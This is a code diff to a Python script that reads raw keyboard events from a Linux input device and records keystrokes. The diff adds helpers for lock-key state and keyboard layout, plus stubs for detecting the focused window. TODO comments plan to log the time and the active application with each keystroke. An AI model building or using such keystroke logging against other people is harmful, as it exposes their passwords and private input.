@@ -14,7 +14,7 @@ NOTE: Read from /dev/input/event3
 values for timeval, type, code and value are located in /usr/include/linux/input-event-codes.h
 """
 
-#TODO: Look into the xlib module
+#TODO: Look into the xlib module for getting current window in focus
 
 #TODO: When recording keystrokes add date/time of keystrokes and also the application that
 #      is currrently in focus
@@ -49,11 +49,26 @@ def parse_input_event_codes():
 
     return key_consts
 
+' Gets current state of caps lock and nums lock keys '
 def get_capsnum_lock():
     ps_res = subprocess.run(["xset", "-q"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     res_out = ps_res.stdout.decode()
     res = re.sub("[0123456789 ]", "", res_out).split("\n")[3].split(":")
     return [res[2], res[4]]
+
+' Gets current keyboard layout, e.g UK, US, etc. '
+def get_keyboard_layout():
+    ps = subprocess.run(["setxkbmap", "-query"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    layout_line = ps.stdout.decode().split("\n")[2].replace(" ", "").split(":")
+    return layout_line[1].split(",")[0]
+
+' Gets process of the window currrently in focus '
+def get_focused_window():
+    pass
+
+' Changes key code values to ascii values, e.g. KEY_MINUS to -, dependant on the keyboard layout '
+def key_code_to_ascii():
+    pass
 
 def main():
     form = "llHHI"
@@ -102,4 +117,5 @@ def main():
     finally:f.close()
 
 if __name__ == '__main__':
-    main()
+    #main()
+    print(get_keyboard_layout())
